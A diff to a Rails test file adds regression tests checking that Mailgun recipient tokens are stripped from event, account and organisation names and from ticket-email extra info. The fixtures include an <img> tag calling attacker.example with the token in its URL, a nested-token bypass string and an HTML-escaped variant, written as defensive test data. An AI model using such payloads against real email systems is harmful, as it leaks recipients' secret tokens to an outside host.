@@ -148,7 +148,7 @@ class EventsTest < ActiveSupport::TestCase
     create_event(
       name: 'Workshop %recipient.token%',
       prices: [0],
-      extra_info_for_ticket_email: '<img src="https://attacker.example/%recipient.token%">'
+      extra_info_for_ticket_email: '<img src="https://attacker.example/%recipient.tok%recipient.token%en%">'
     )
     order = @event.orders.new(account: @account)
     html = EmailHelper.html(:tickets, event: @event, order: order, account: @account, tickets_table: '', header_image_url: nil)
@@ -160,6 +160,9 @@ class EventsTest < ActiveSupport::TestCase
   end
 
   test 'names cannot keep a mailgun recipient token' do
+    assert_equal '', EmailHelper.strip_recipient_secrets('%recipient.tok%recipient.token%en%')
+    assert_equal 'Workshop', EmailHelper.strip_recipient_secrets('Workshop %recipient.tok%recipient.token%en%').squish
+
     create_event(name: 'Workshop %recipient.token%', prices: [0])
     @account.update!(name: 'Ada %recipient.token%')
     @organisation.update!(name: 'Org %recipient.token%')
@@ -167,6 +170,19 @@ class EventsTest < ActiveSupport::TestCase
     assert_equal 'Workshop', @event.name
     assert_equal 'Ada', @account.name
     assert_equal 'Org', @organisation.name
+
+    @event.update!(name: 'Workshop %recipient.tok%recipient.token%en%')
+    @account.update!(name: 'Ada %recipient.tok%recipient.token%en%')
+    @organisation.update!(name: 'Org %recipient.tok%recipient.token%en%')
+
+    assert_equal 'Workshop', @event.name
+    assert_equal 'Ada', @account.name
+    assert_equal 'Org', @organisation.name
+
+    @event.update!(name: 'Workshop &lt;img src="https://attacker.example/%recipient.token%"&gt;')
+    assert_equal 'Workshop', @event.name
+    refute_match(/<img/i, @event.name)
+    refute_includes @event.name, '%recipient'
   end
 
   test 'nested ticket type cannot reference another event ticket group' do
